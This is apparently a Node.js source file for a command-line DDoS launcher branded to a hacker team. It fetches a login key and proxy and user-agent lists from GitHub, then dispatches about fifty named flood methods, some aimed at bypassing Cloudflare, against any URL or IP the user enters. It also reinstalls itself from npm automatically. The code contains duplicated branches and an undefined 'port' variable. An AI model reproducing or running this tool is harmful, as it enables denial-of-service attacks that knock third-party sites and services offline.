#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '8.1.6'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})


// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
  console.clear();
  const date = new Date();
  const year = date.getFullYear();
  const month = (date.getMonth() + 1).toString().padStart(2, '0');
  const day = date.getDate().toString().padStart(2, '0');
  
  const activeAttacks = processList.length;
console.clear()
console.log(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠻⣥⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⡿⠻⣆⠙⠦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠁⠀⠘⣆⡔⢶⣆⠉⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⡿⢿⡀⠉⠀⠞⠹⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⡄⠀⡇⠘⣧⣀⣀⣀⠀⠻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠃⠁⢀⣠⠞⣹⢿⠻⡟⢿⣿⣯⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠃⠶⠒⠉⠁⣴⠇⢸⡇⡟⡷⢬⡙⠎⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⠇⢀⣠⣄⡀⠚⠁⠀⠈⠀⠀⣷⠀⠉⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⣽⣿⣶⠋⢉⡿⠇⠀⠀⠀⠀⠀⣰⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⣿⣿⠇⠀⣠⣥⣤⡀⠀⠀⠀⢀⡟⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀       >̳>̳>̳ ̳T̳O̳O̳L̳ ̳I̳N̳F̳O̳ ̳<̳<̳<̳
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢿⣿⢀⣾⡟⠉⢹⡇⠀⠀⠀⢸⠁⡿⠙⣿⣷⣄⡀                  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢸⣇⣾⡟⠀⠸⡏⣄⡀⠀⠀⢹⢀⡇⢀⢘⢿⣮⡙⠀⠀⠀⠀⠀⠀⠀⠀      ×|| OWNER : RAFLY
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣇⠀⡀⣧⠰⣿⣶⣄⠀⠀⠀⠘⣎⠳⣿⣿⣦⡀⠀⠀⠀⠀   ⠀⠀   ×|| TEAM : #BLACKWOLFTEAM
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡿⣿⣆⠹⣿⡐⣾⣷⣹⣆⠀⠀⠀⠘⢷⣄⣻⣿⣿⣷⡄⠀⠀⠀   ⠀   ×|| TELE : @PTOFS
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢿⣿⣦⠽⣇⣹⣟⢿⠙⠁⠀⠀⠀⣤⠉⠻⣿⣿⣿⣿⣦⡀⠀   ⠀   ×|| DATE : ${year}-${month}-${day}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠙⡟⠂⣿⢹⡿⣼⠇⠀⠀⣀⠀⣷⡀⠀⠈⠻⣿⣿⣿⣷⡀⠀        𝐜𝐫𝐞𝐚𝐭𝐞𝐝 𝐛𝐲 © Ⓡ𝓪ᶠˡ𝔂 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡆⢻⠀⠉⢸⡇⠈⣀⣠⣾⠇⠀⠻⣿⣦⣤⣴⣿⠿⣿⡿⣷⠀  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⢸⡀⠀⢸⠁⣰⠛⣽⡧⠖⠻⢿⡆⠈⠉⠉⠀⠀⢻⣷⠹⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠘⡇⠀⢸⢰⡏⢰⡟⠀⣀⣀⡼⠃⠀⢀⡆⠀⠀⠘⣿⡆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣴⣿⣶⣷⣶⣾⣿⣧⣾⣤⣄⣀⣀⣤⣤⣶⡿⠀⠀⠀⢠⣿⡇     
⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣟⡛⠛⠛⠉⠉⠉⠉⢉⣭⣽⡿⠿⠿⠿⠛⠛⠛⠓⠲⠦⠄⣼⢻⡇⠀
⠀⠀⠀⠀⠀⠀⠘⢉⣼⣿⣿⠿⠛⠛⠁⠀⠀⣠⠖⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⣸⡇⠀
⠀⠀⠀⠀⠀⢀⣴⠿⠛⠁⢀⣀⣀⣀⣀⣀⣄⡀⠀⠀⠀⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠇⣰⣿⠁⠀
⠀⠀⠀⢀⣴⣟⣥⣶⣾⣿⣿⣿⣿⣿⣿⣭⣤⣤⣤⣀⣀⡀⠈⠛⠶⢶⣶⣶⣶⣾⣿⣿⣿⠟⠁⠀⠀
⠀⢀⣴⡿⠟⠋⡽⠟⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠙⠛⠛⠛⠿⠿⠿⠿⠟⠛⠉⠁⠀⠀⠀⠀    
⠐⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                               `)};

async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
    console.log(`|| ▓▓░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/Xlamper/PermenMdXlamper-Version-8.1.6-/refs/heads/main/version.txt');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
    console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
    
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/Xlamper/PermenMdXlamper-Version-8.1.6-/refs/heads/main/mengerikan.txt');
    const password = await secretBangetJir.text();
    await console.log(`Login Key Required`)
    permen.question('[\x1b[1m\x1b[31mKEY\x1b[0m]: \n', async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`Successfuly Logged`)
        await scrapeProxy()
        console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
        await scrapeUserAgent()
        console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
        await sleep(700)
        console.clear()
        console.log(`🇦 𝑁𝕁☠ 𝐹L͎𝑂D̑̈🅴︎R̺͆⚡️ ➵  ${version}`)
        await sleep(1000)
		    await banner()
        console.log(`Type "menu" For Showing All Available Command`)
        sigma()
      } else {
        console.log(`Wrong Key`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      console.log(`Waiting Auto Update...`)
      await exec(`npm uninstall -g prmnmd-tuls`)
      console.log(`Installing update`)
      await exec(`npm i -g prmnmd-tuls`)
      console.log(`Restart Tools Please`)
      process.exit()
    }
  } catch (error) {
    console.log(`Are You Online?`)
  }
}
// [========================================] //
async function pushMonitor(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function monitorAttack() {
  console.log("\nMonitor Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack <url/ip> <duration> <methods>
attack https://google.com 120 flood`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠿⠿⠛⠛⠿⠿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠰⠛⢁⣠⣤⣶⣶⣶⣶⣤⣄⡈⠛⠆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⡿⠋⣉⠉⢻⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⣿⡿⠋⠘⣿⣇⠀⠿⠇⢸⣿⡗⠉⠻⣿⣿⣆⠀⠀⠀⠀ 
⠀⠀⠀⣼⣿⣿⣧⣄⠀⠻⣿⣷⣤⣶⣿⠟⠁⢀⣴⣿⣿⣿⣧⠀⠀⠀
⠀⠀⣼⣿⣿⣿⣿⣿⣷⣤⣀⣉⠉⢉⣀⣠⣶⣿⣿⣿⣿⣿⣿⣧⠀⠀
⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
⠉⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠉
                        #🇦 𝑁𝕁O 𝐹L͎𝑂D̑̈🅴︎R̺͆⚡️⁩
                                    
𝕬𝖙𝖙𝖆𝖈𝖐 𝕯𝖊𝖙𝖆𝖎𝖑𝖘                             
---------------------------------------------------------------------
𝕿𝖆𝖗𝖌𝖊𝖙   : ${target}                                                
𝕯𝖚𝖗𝖆𝖙𝖎𝖔𝖓 : ${duration}                                              
𝕸𝖊𝖙𝖍𝖔𝖉𝖘  : ${methods}                                                
𝕬𝕾       : ${result.as}                                             
𝕴𝕻       : ${result.query}                                          
𝕴𝕾𝕻      : ${result.isp}                                           

𝕷𝕴𝕾𝕿 𝕬𝕿𝕿𝕬𝕮𝕶 : ${processList.length}
---------------------------------------------------------------------
𝕵𝕺𝕴𝕹 𝕸𝖄 𝕿𝕰𝕬𝕸  : @𝕭𝕷𝕬𝕮𝕶𝖂𝕺𝕷𝕱𝕿𝕰𝕬𝕸                                      
𝕻𝕺𝖂𝕰𝕽 𝕻𝕽𝕺𝕺𝕱   : @𝕻𝖙𝖔𝖋𝖘                                             

𝕬𝖈𝖙𝖎𝖛𝖆𝖙𝖎𝖓𝖌 𝖆𝖙𝖙𝖆𝖈𝖐...

`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
 if (methods === 'night-flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 90 32 proxy.txt flood`)
	sigma()
  } else if (methods === 'uam') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 60 20 proxy.txt`)
	sigma()
  } else if (methods === 'medusa') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 200 50 proxy.txt`)
	sigma()
  } else if (methods === 'night-bypas') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 90 40 proxy.txt bypass`)
	sigma()
  } else if (methods === 'tlsv1') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'boom') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40`)
	sigma()
  } else if (methods === 'tornado') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} GET ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'xlamper-bom') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40`)
	sigma()
  } else if (methods === 'black') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40`)
	sigma()
  } else if (methods === 'xlamper') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'inferno') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'killer') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'tls-bypass') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'lezkill') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'vxx') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'geckold') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
  } else if (methods === 'mix') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 40`)
	sigma()
  } else if (methods === 'mixsyn') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 40`)
	sigma()
  } else if (methods === 'glory') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 50 proxy.txt`)
	sigma()
  } else if (methods === 'skynet-tls') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 50 proxy.txt`)
	sigma()
  } else if (methods === 'tls-vip') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 50 proxy.txt`)
	sigma()
  } else if (methods === 'flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} proxy.txt 8 500`)
	sigma()
  } else if (methods === 'nflood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 50 proxy.txt 100 flood`)
	sigma()
  } else if (methods === 'tls') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 90 50 proxy.txt`)
    sigma()
  } else if (methods === 'strike') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} GET ${target} ${duration} 50 100 proxy.txt --full`)
    sigma()
  } else if (methods === 'kill') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 50`)
    sigma()
  } else if (methods === 'bypass') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} proxy.txt  http ${duration} 50 true`)
    sigma()
  } else if (methods === 'raw') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
    sigma()
  } else if (methods === 'thunder') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 1000 50 proxy.txt`)
    sigma()
  } else if (methods === 'rape') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${duration} 50 proxy.txt 1000 ${target}`)
     sigma()
  } else if (methods === 'storm') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 1000 50 proxy.txt`)
    sigma()
  } else if (methods === 'destroy') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 1000 50 proxy.txt`)
    sigma()
  } else if (methods === 'tlsv2') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 1000 50 proxy.txt`)
	sigma()
  } else if (methods === 'httpbypass') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'HTTP-ENGINE') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} ua.txt 50 GET proxy.txt referer.txt`)
    sigma()
  } else if (methods === 'tcp-flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${port} 50 -1 ${duration}`)
    sigma()
  } else if (methods === 'pentest') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${port} ${duration}`)
    sigma()
  } else if (methods === 'HTTP-RAW') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
    sigma()
  } else if (methods === 'UAM-RAPE') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} 50 ${duration}`)
    sigma()
  } else if (methods === 'CF-GLACIER') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} GET ${target} proxy.txt ${duration} 1000 50`)
    sigma()
  } else if (methods === 'destroy') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 1000 50 proxy.txt`)
    sigma()
  } else if (methods === 'destroy') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 80 proxy.txt`)
    sigma()
  } else if (methods === 'CFbypass') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'HTTP-GET') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'HTTP-MIXv2') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} GET ${target} proxy.txt ${duration} 1000 50`)
	sigma()
  } else if (methods === 'WAR') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 1000 50 proxy.txt`)
	sigma()
  } else if (methods === 'HTTP-X') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 1000 50 proxy.txt`)
	sigma()
  } else if (methods === 'starts') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} GET ${target} proxy.txt ${duration} 100 50 baloo=false`)
	sigma()
  } else if (methods === 'NUKE') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 1000 50 proxy.txt`)
	sigma()
  } else if (methods === 'cloudflare') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 1000 50 proxy.txt`)
	sigma()
  } else if (methods === 'WAR') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 1000 50 proxy.txt`)
	sigma()
  } else if (methods === 'BROWSERV2') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} proxy.txt ua.txt 50 200`)
	sigma()
  } else if (methods === 'god') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 1000 50 proxy.txt`)
	sigma()
  } else if (methods === 'rand') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'Browser') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 1000 50 proxy.txt`)
	sigma()
  } else if (methods === 'rapid') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 50 proxy.txt`)
  } else if (methods === 'slim') {
       pushMonitor(target, methods, duration)
const destroy = path.join(__dirname, `/lib/cache/destroy`);
const storm = path.join(__dirname, `/lib/cache/storm`);
const rape = path.join(__dirname, `/lib/cache/rape`);
        exec(`node ${destroy} ${target} ${duration} 1000 40 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 1000 40 proxy.txt`)
        exec(`node ${rape} ${duration} 40 proxy.txt 1000 ${target}`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
Created And Coded Full By Xlamper

Thx To:
Gilank Sanz
W4R
AndraXploit
`
permen.question('╭─[\x1b[1m\x1b[32mMaster-Ddos-Ptofs\x1b[0m]: \n╰┈┈➤',(input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'menu') {
    console.log(`
| methods      | show list of available methods
| attack       | launch ddos attack
| monitor      | show monitor attack
| credits      | show creator of these tools
| clear        | clear terminal
`);
    sigma();
  } else if (command === 'menu') {
    console.log(`
==============================================
                TOOLS COMMANDS
==============================================

| COMMAND      | DESCRIPTION
-----------------------------------------------------------------------------------------------------------
| methods      | Show list of available methods.
| DDos         | Launch an attack: <url/ip> <duration> <methods>.
| monitor      | Display ongoing attack monitor.
| credits      | Show creator of these tools.
| clear

`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
+---------------------+--------------------------------------------+-------+
| Methods             | Description                                | Info  |
+---------------------+--------------------------------------------+-------+
| night-flood         | attack <url/ip> <time> <methods>           | L7    |
| uam                 | attack <url/ip> <time> <methods>           | L7    |
| medusa              | attack <url/ip> <time> <methods>           | L7    |
| night-bypas         | attack <url/ip> <time> <methods>           | L7    |
| tlsv1               | attack <url/ip> <time> <methods>           | L7    |
| boom                | attack <url/ip> <time> <methods>           | L7    |
| tornado             | attack <url/ip> <time> <methods>           | L7    |
| xlamper-bom         | attack <url/ip> <time> <methods>           | L7    |
| black               | attack <url/ip> <time> <methods>           | L7    |
| xlamper             | attack <url/ip> <time> <methods>           | L7    |
| inferno             | attack <url/ip> <time> <methods>           | L7    |
| killer              | attack <url/ip> <time> <methods>           | L7    |
| tls-bypass          | attack <url/ip> <time> <methods>           | L7    |
| lezkill             | attack <url/ip> <time> <methods>           | L7    |
| vxx                 | attack <url/ip> <time> <methods>           | L7    |
| geckold             | attack <url/ip> <time> <methods>           | L7    |
| mix                 | attack <url/ip> <time> <methods>           | L7    |
| mixsyn              | attack <url/ip> <time> <methods>           | L7    |
| glory               | attack <url/ip> <time> <methods>           | L7    |
| skynet-tls          | attack <url/ip> <time> <methods>           | L7    |
| tls-vip             | attack <url/ip> <time> <methods>           | L7    |
| flood               | attack <url/ip> <time> <methods>           | L7    |
| tls                 | attack <url/ip> <time> <methods>           | L7    |
| strike              | attack <url/ip> <time> <methods>           | L7    |
| kill                | attack <url/ip> <time> <methods>           | L7    |
| bypass              | attack <url/ip> <time> <methods>           | L7    |
| raw                 | attack <url/ip> <time> <methods>           | L7    |
| thunder             | attack <url/ip> <time> <methods>           | L7    |
| rape                | attack <url/ip> <time> <methods>           | L7    |
| storm               | attack <url/ip> <time> <methods>           | L7    |
| destroy             | attack <url/ip> <time> <methods>           | L7    |
| tlsv2               | attack <url/ip> <time> <methods>           | L7    |
| nflood              | attack <url/ip> <time> <methods>           | L7    |
| httpbypass          | attack <url/ip> <time> <methods>           | L7    |
| HTTP-ENGINE         | attack <url/ip> <time> <methods>           | L7    |
| HTTP-RAW            | attack <url/ip> <time> <methods>           | L7    |
| UAM-RAPE            | attack <url/ip> <time> <methods>           | L7    |
| CF-GLACIER          | attack <url/ip> <time> <methods>           | L7    |
| CFbypass            | attack <url/ip> <time> <methods>           | L7    |
| HTTP-GET            | attack <url/ip> <time> <methods>           | L7    |
| HTTP-MIXv2          | attack <url/ip> <time> <methods>           | L7    |
| WAR                 | attack <url/ip> <time> <methods>           | L7    |
| HTTP-X              | attack <url/ip> <time> <methods>           | L7    |
| starts              | attack <url/ip> <time> <methods>           | L7    |
| NUKE                | attack <url/ip> <time> <methods>           | L7    |
| cloudflare          | attack <url/ip> <time> <methods>           | L7    |
| BROWSERV2           | attack <url/ip> <time> <methods>           | L7    |
| god                 | attack <url/ip> <time> <methods>           | L7    |
| rand                | attack <url/ip> <time> <methods>           | L7    |
| Browser             | attack <url/ip> <time> <methods>           | L7    |
| browser1            | attack <url/ip> <time> <methods>           | L7    |
| slim                | attack <url/ip> <time> <methods>           | L7    |
+---------------------+--------------------------------------------+-------+


`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'monitor') {
    monitorAttack()
    sigma()
  } else if (command === 'clear') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()
